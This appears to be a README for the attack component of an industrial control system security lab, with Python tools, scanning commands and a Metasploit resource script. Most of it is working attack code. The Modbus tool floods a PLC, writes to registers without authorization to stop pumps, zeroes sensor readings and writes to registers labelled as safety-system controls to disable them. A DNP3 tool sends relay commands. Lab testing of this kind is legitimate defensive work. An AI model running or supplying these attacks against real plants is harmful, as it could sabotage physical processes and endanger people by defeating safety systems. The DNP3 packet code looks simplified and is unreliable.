# 🎯 Attack Module - ICS Cybersecurity Testing Platform

## Overview
The Attack Module provides a comprehensive suite of tools and scripts for simulating real-world cyber attacks against Industrial Control Systems. This module runs on a dedicated Kali Linux VM and includes both automated and manual attack capabilities.

## Architecture

```
Attack VM (192.168.100.20)
├── Metasploit Framework
│   ├── ICS-specific modules
│   ├── Custom exploit development
│   └── Post-exploitation tools
├── Custom Attack Scripts
│   ├── Modbus exploitation
│   ├── DNP3 manipulation
│   └── Network reconnaissance
├── Attack Scenarios
│   ├── Stuxnet-style attacks
│   ├── Insider threat simulation
│   └── Zero-day exploitation
└── Monitoring & Logging
    ├── Attack execution logs
    ├── Network traffic capture
    └── Performance metrics
```

## Components

### 1. Metasploit Framework
- **Purpose**: Primary exploitation framework
- **Modules**: ICS-specific exploits for Modbus, DNP3, OPC-UA
- **Configuration**: Custom resource scripts for automated attacks

### 2. Custom Attack Tools
- **ModbusExploit**: Python-based Modbus manipulation
- **DNP3Attacker**: DNP3 protocol exploitation
- **NetworkScanner**: Industrial device discovery
- **TrafficGenerator**: DoS and flooding attacks

### 3. Attack Scenarios
- **Scenario 1**: Stuxnet-style multi-stage attack
- **Scenario 2**: Insider threat simulation
- **Scenario 3**: Zero-day vulnerability exploitation

## Installation & Setup

### Prerequisites
```bash
# Update Kali Linux
sudo apt update && sudo apt upgrade -y

# Install required packages
sudo apt install -y python3 python3-pip git nmap wireshark
```

### Metasploit Setup
```bash
# Install Metasploit Framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall

# Initialize database
msfdb init
msfdb start
```

### Custom Tools Installation
```bash
# Clone attack tools
cd /opt
sudo git clone https://github.com/your-repo/ics-attack-tools.git
cd ics-attack-tools

# Install Python dependencies
pip3 install -r requirements.txt
```

## Attack Scenarios

### Scenario 1: Stuxnet-Style Attack (3 minutes)
**Objective**: Demonstrate sophisticated multi-stage attack with real operational impact

**Timeline**:
- 00:00 - Normal operations baseline
- 00:30 - Initial reconnaissance and device discovery
- 01:00 - Exploitation and unauthorized access
- 01:30 - Process manipulation and sabotage
- 02:00 - Defense system detection and response
- 02:30 - Attack neutralization and system recovery
- 03:00 - Post-attack analysis and learning

**Tools Used**:
- Network reconnaissance: `nmap`, `modbus-scanner`
- Exploitation: Custom Modbus exploit scripts
- Process manipulation: `pymodbus` library
- Traffic analysis: Wireshark for monitoring

### Scenario 2: Insider Threat (2 minutes)
**Objective**: Simulate malicious insider with legitimate access

**Timeline**:
- 00:00 - Legitimate operator session
- 00:20 - Suspicious access patterns
- 00:40 - Unauthorized data extraction
- 01:00 - Process configuration changes
- 01:20 - Defense system behavioral detection
- 01:40 - Access restriction and alerting
- 02:00 - Threat containment

**Tools Used**:
- Legitimate HMI access
- Custom data extraction scripts
- Behavioral analysis bypass attempts
- Forensic evidence collection

### Scenario 3: Zero-Day Exploitation (2 minutes)
**Objective**: Demonstrate resilience against unknown attack vectors

**Timeline**:
- 00:00 - Novel attack method deployment
- 00:30 - Unknown exploitation technique
- 01:00 - Behavioral anomaly detection
- 01:20 - Autonomous response without signatures
- 01:40 - Attack neutralization
- 02:00 - System learning and adaptation

**Tools Used**:
- Custom zero-day exploit development
- Novel protocol manipulation
- Behavioral analysis testing
- Adaptive response validation

## Custom Attack Scripts

### ModbusExploit.py
```python
#!/usr/bin/env python3
"""
Modbus Exploitation Tool
Targets: OpenPLC, ModbusPal, Real PLCs
Protocol: Modbus TCP
"""

import pymodbus
from pymodbus.client.sync import ModbusTcpClient
import time
import threading

class ModbusExploit:
    def __init__(self, target_ip, port=502):
        self.target_ip = target_ip
        self.port = port
        self.client = None
        
    def connect(self):
        """Establish Modbus connection"""
        try:
            self.client = ModbusTcpClient(self.target_ip, self.port)
            return self.client.connect()
        except Exception as e:
            print(f"Connection failed: {e}")
            return False
            
    def flood_attack(self, duration=30):
        """Modbus flooding attack"""
        print(f"Starting Modbus flood attack for {duration} seconds...")
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                # Rapid read requests
                for register in range(40001, 40011):
                    self.client.read_holding_registers(register, 1)
                time.sleep(0.01)  # 10ms delay
            except Exception as e:
                print(f"Flood attack error: {e}")
                break
                
    def unauthorized_write(self, register, value):
        """Unauthorized register write"""
        try:
            result = self.client.write_register(register, value)
            print(f"Unauthorized write to {register}: {value}")
            return result
        except Exception as e:
            print(f"Write failed: {e}")
            return False
            
    def data_manipulation(self):
        """Sensor data manipulation attack"""
        # Manipulate sensor readings to hide malicious activity
        sensors = [40021, 40022, 40023, 40024]  # Flow rate sensors
        for sensor in sensors:
            self.unauthorized_write(sensor, 0)  # Set flow to 0
            time.sleep(0.5)
            
    def emergency_shutdown_bypass(self):
        """Attempt to bypass emergency shutdown"""
        # Target safety system registers
        safety_registers = [40071, 40072, 40073, 40074]
        for reg in safety_registers:
            self.unauthorized_write(reg, 1)  # Disable safety systems
            time.sleep(0.2)

if __name__ == "__main__":
    # Example usage
    exploit = ModbusExploit("192.168.100.10")
    if exploit.connect():
        print("Connected to target PLC")
        # Run attack scenarios
        exploit.unauthorized_write(40001, 0)  # Stop pump 1
        exploit.data_manipulation()
        exploit.flood_attack(10)
    else:
        print("Failed to connect")
```

### DNP3Attacker.py
```python
#!/usr/bin/env python3
"""
DNP3 Protocol Attack Tool
Targets: DNP3-enabled devices
Protocol: DNP3 over TCP
"""

import socket
import struct
import time

class DNP3Attacker:
    def __init__(self, target_ip, port=20000):
        self.target_ip = target_ip
        self.port = port
        self.socket = None
        
    def connect(self):
        """Establish DNP3 connection"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.target_ip, self.port))
            return True
        except Exception as e:
            print(f"DNP3 connection failed: {e}")
            return False
            
    def send_dnp3_command(self, command_data):
        """Send DNP3 command"""
        try:
            # DNP3 header construction
            header = struct.pack('>BBHH', 0x05, 0x64, len(command_data), 0x0001)
            packet = header + command_data
            self.socket.send(packet)
            return True
        except Exception as e:
            print(f"Command failed: {e}")
            return False
            
    def control_relay(self, relay_id, state):
        """Control relay output"""
        # DNP3 control relay command
        command = struct.pack('>BBH', 0x0C, 0x01, relay_id)
        return self.send_dnp3_command(command)
        
    def read_analog(self, point_id):
        """Read analog input"""
        # DNP3 read analog command
        command = struct.pack('>BBH', 0x01, 0x01, point_id)
        return self.send_dnp3_command(command)

if __name__ == "__main__":
    attacker = DNP3Attacker("192.168.100.10")
    if attacker.connect():
        print("DNP3 connection established")
        # Example attacks
        attacker.control_relay(1, 1)  # Activate relay 1
        attacker.read_analog(1)       # Read analog input 1
```

## Network Reconnaissance

### Industrial Device Discovery
```bash
#!/bin/bash
# industrial_scan.sh - Discover ICS devices on network

echo "Starting industrial device discovery..."

# Scan for common ICS ports
nmap -sS -p 502,20000,9600,8080,22 192.168.100.0/24 -oN ics_scan.txt

# Modbus device discovery
python3 modbus_discovery.py --network 192.168.100.0/24

# DNP3 device discovery  
python3 dnp3_discovery.py --network 192.168.100.0/24

echo "Discovery complete. Results saved to ics_scan.txt"
```

### Protocol Fingerprinting
```python
#!/usr/bin/env python3
"""
Protocol Fingerprinting Tool
Identifies industrial protocols and device types
"""

import socket
import struct
import threading
import time

class ProtocolFingerprinter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.results = {}
        
    def check_modbus(self, port=502):
        """Check for Modbus TCP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.target_ip, port))
            if result == 0:
                # Send Modbus request
                request = b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01'
                sock.send(request)
                response = sock.recv(1024)
                if len(response) > 0:
                    self.results['modbus'] = {'port': port, 'response': response.hex()}
            sock.close()
        except Exception as e:
            pass
            
    def check_dnp3(self, port=20000):
        """Check for DNP3"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.target_ip, port))
            if result == 0:
                # Send DNP3 request
                request = b'\x05\x64\x05\x00\x00\x00\x00\x00\x00\x00\x00'
                sock.send(request)
                response = sock.recv(1024)
                if len(response) > 0:
                    self.results['dnp3'] = {'port': port, 'response': response.hex()}
            sock.close()
        except Exception as e:
            pass
            
    def fingerprint_all(self):
        """Run all fingerprinting checks"""
        threads = []
        protocols = [
            (self.check_modbus, 502),
            (self.check_dnp3, 20000),
            (self.check_modbus, 9600),  # Alternative Modbus port
        ]
        
        for protocol_func, port in protocols:
            thread = threading.Thread(target=protocol_func, args=(port,))
            threads.append(thread)
            thread.start()
            
        for thread in threads:
            thread.join()
            
        return self.results

if __name__ == "__main__":
    fingerprinter = ProtocolFingerprinter("192.168.100.10")
    results = fingerprinter.fingerprint_all()
    print("Protocol fingerprinting results:")
    for protocol, data in results.items():
        print(f"{protocol}: {data}")
```

## Attack Execution Scripts

### Automated Attack Runner
```python
#!/usr/bin/env python3
"""
Automated Attack Scenario Runner
Executes predefined attack scenarios with timing
"""

import time
import threading
import logging
from datetime import datetime

class AttackRunner:
    def __init__(self):
        self.logger = self.setup_logging()
        self.attack_results = {}
        
    def setup_logging(self):
        """Setup attack logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('attack_execution.log'),
                logging.StreamHandler()
            ]
        )
        return logging.getLogger(__name__)
        
    def run_scenario_1(self):
        """Execute Stuxnet-style attack scenario"""
        self.logger.info("Starting Scenario 1: Stuxnet-style attack")
        
        # Phase 1: Reconnaissance
        self.logger.info("Phase 1: Network reconnaissance")
        time.sleep(30)  # Simulate reconnaissance time
        
        # Phase 2: Exploitation
        self.logger.info("Phase 2: Exploitation and access")
        time.sleep(30)  # Simulate exploitation time
        
        # Phase 3: Process manipulation
        self.logger.info("Phase 3: Process manipulation")
        time.sleep(30)  # Simulate manipulation time
        
        # Phase 4: Defense response
        self.logger.info("Phase 4: Defense system response")
        time.sleep(30)  # Simulate response time
        
        self.logger.info("Scenario 1 completed")
        
    def run_scenario_2(self):
        """Execute insider threat scenario"""
        self.logger.info("Starting Scenario 2: Insider threat")
        
        # Phase 1: Legitimate access
        self.logger.info("Phase 1: Legitimate operator session")
        time.sleep(20)  # Simulate normal operations
        
        # Phase 2: Suspicious behavior
        self.logger.info("Phase 2: Suspicious access patterns")
        time.sleep(20)  # Simulate suspicious activity
        
        # Phase 3: Unauthorized actions
        self.logger.info("Phase 3: Unauthorized data extraction")
        time.sleep(20)  # Simulate data theft
        
        # Phase 4: Detection and response
        self.logger.info("Phase 4: Behavioral detection and response")
        time.sleep(20)  # Simulate detection time
        
        self.logger.info("Scenario 2 completed")
        
    def run_scenario_3(self):
        """Execute zero-day exploitation scenario"""
        self.logger.info("Starting Scenario 3: Zero-day exploitation")
        
        # Phase 1: Novel attack deployment
        self.logger.info("Phase 1: Novel attack method deployment")
        time.sleep(30)  # Simulate attack development
        
        # Phase 2: Unknown exploitation
        self.logger.info("Phase 2: Unknown exploitation technique")
        time.sleep(30)  # Simulate exploitation time
        
        # Phase 3: Behavioral detection
        self.logger.info("Phase 3: Behavioral anomaly detection")
        time.sleep(20)  # Simulate detection time
        
        # Phase 4: Autonomous response
        self.logger.info("Phase 4: Autonomous response without signatures")
        time.sleep(20)  # Simulate response time
        
        self.logger.info("Scenario 3 completed")
        
    def run_all_scenarios(self):
        """Execute all attack scenarios"""
        scenarios = [
            self.run_scenario_1,
            self.run_scenario_2,
            self.run_scenario_3
        ]
        
        for i, scenario in enumerate(scenarios, 1):
            self.logger.info(f"Executing scenario {i}/3")
            try:
                scenario()
                self.attack_results[f"scenario_{i}"] = "SUCCESS"
            except Exception as e:
                self.logger.error(f"Scenario {i} failed: {e}")
                self.attack_results[f"scenario_{i}"] = "FAILED"
                
        self.logger.info("All scenarios completed")
        return self.attack_results

if __name__ == "__main__":
    runner = AttackRunner()
    results = runner.run_all_scenarios()
    print("Attack execution results:", results)
```

## Monitoring & Logging

### Attack Execution Monitor
```python
#!/usr/bin/env python3
"""
Attack Execution Monitor
Tracks attack performance and system impact
"""

import psutil
import time
import json
from datetime import datetime

class AttackMonitor:
    def __init__(self):
        self.metrics = []
        self.start_time = None
        
    def start_monitoring(self):
        """Start attack monitoring"""
        self.start_time = datetime.now()
        print(f"Attack monitoring started at {self.start_time}")
        
    def collect_metrics(self):
        """Collect system metrics"""
        metrics = {
            'timestamp': datetime.now().isoformat(),
            'cpu_percent': psutil.cpu_percent(),
            'memory_percent': psutil.virtual_memory().percent,
            'network_io': psutil.net_io_counters()._asdict(),
            'disk_io': psutil.disk_io_counters()._asdict() if psutil.disk_io_counters() else {}
        }
        self.metrics.append(metrics)
        return metrics
        
    def monitor_attack(self, duration=180):
        """Monitor attack execution for specified duration"""
        self.start_monitoring()
        
        for i in range(duration):
            metrics = self.collect_metrics()
            print(f"Time: {i}s, CPU: {metrics['cpu_percent']}%, Memory: {metrics['memory_percent']}%")
            time.sleep(1)
            
        self.save_metrics()
        
    def save_metrics(self):
        """Save collected metrics to file"""
        with open('attack_metrics.json', 'w') as f:
            json.dump(self.metrics, f, indent=2)
        print(f"Metrics saved to attack_metrics.json")

if __name__ == "__main__":
    monitor = AttackMonitor()
    monitor.monitor_attack(180)  # Monitor for 3 minutes
```

## Configuration Files

### Metasploit Resource Scripts
```ruby
# stuxnet_attack.rc
# Metasploit resource script for Stuxnet-style attack

# Set workspace
workspace -d default
workspace -a ics_attack

# Set target
setg RHOSTS 192.168.100.10
setg RPORT 502

# Use Modbus scanner
use auxiliary/scanner/scada/modbusdetect
run

# Use Modbus client
use auxiliary/client/scada/modbusclient
set ACTION READ_HOLDING_REGISTERS
set DATA_ADDRESS 40001
set QUANTITY 10
run

# Use custom exploit
use exploit/industrial/modbus_unauthorized_write
set REGISTER 40001
set VALUE 0
run
```

### Attack Configuration
```yaml
# attack_config.yaml
attack_scenarios:
  stuxnet_style:
    name: "Stuxnet-Style Attack"
    duration: 180
    phases:
      - reconnaissance: 30
      - exploitation: 30
      - manipulation: 30
      - response: 30
    targets:
      - ip: "192.168.100.10"
        protocol: "modbus"
        port: 502
    tools:
      - "modbus_exploit.py"
      - "network_scanner.sh"
      
  insider_threat:
    name: "Insider Threat Simulation"
    duration: 120
    phases:
      - legitimate_access: 20
      - suspicious_behavior: 20
      - unauthorized_actions: 20
      - detection_response: 20
    targets:
      - ip: "192.168.100.10"
        protocol: "http"
        port: 8080
    tools:
      - "hmi_access.py"
      - "data_extraction.py"
      
  zero_day:
    name: "Zero-Day Exploitation"
    duration: 120
    phases:
      - novel_attack: 30
      - exploitation: 30
      - detection: 20
      - response: 20
    targets:
      - ip: "192.168.100.10"
        protocol: "custom"
        port: 502
    tools:
      - "zero_day_exploit.py"
      - "behavioral_test.py"

monitoring:
  metrics_collection: true
  log_level: "INFO"
  output_file: "attack_execution.log"
  
network:
  target_network: "192.168.100.0/24"
  attack_vm_ip: "192.168.100.20"
  ics_vm_ip: "192.168.100.10"
  defense_vm_ip: "192.168.100.30"
```

## Usage Instructions

### Quick Start
```bash
# 1. Setup attack environment
cd /opt/attack-module
./setup.sh

# 2. Configure targets
python3 configure_targets.py --targets 192.168.100.10,192.168.100.11

# 3. Run reconnaissance
python3 industrial_scan.py --network 192.168.100.0/24

# 4. Execute attack scenarios
python3 attack_runner.py --scenario stuxnet_style
python3 attack_runner.py --scenario insider_threat
python3 attack_runner.py --scenario zero_day

# 5. Monitor execution
python3 attack_monitor.py --duration 180
```

### Manual Attack Execution
```bash
# Connect to target PLC
python3 modbus_exploit.py --target 192.168.100.10 --action flood

# Execute unauthorized writes
python3 modbus_exploit.py --target 192.168.100.10 --action write --register 40001 --value 0

# Run data manipulation
python3 modbus_exploit.py --target 192.168.100.10 --action manipulate
```

## Safety and Ethics

### Important Notes
- **Lab Environment Only**: All attacks are designed for controlled lab environments
- **No Production Use**: Never use these tools against production systems
- **Legal Compliance**: Ensure all testing complies with local laws and regulations
- **Documentation**: Maintain detailed logs of all attack activities

### Safety Measures
- Network isolation to prevent accidental impact
- Automatic shutdown mechanisms
- Comprehensive logging and monitoring
- Emergency stop procedures

## Troubleshooting

### Common Issues
1. **Connection Failures**: Check network configuration and firewall settings
2. **Tool Errors**: Verify Python dependencies and permissions
3. **Performance Issues**: Monitor system resources and adjust timing
4. **Logging Problems**: Check file permissions and disk space

### Emergency Procedures
- **Stop All Attacks**: `./emergency_stop.sh`
- **Reset Network**: `./reset_network.sh`
- **Restore Systems**: `./restore_systems.sh` 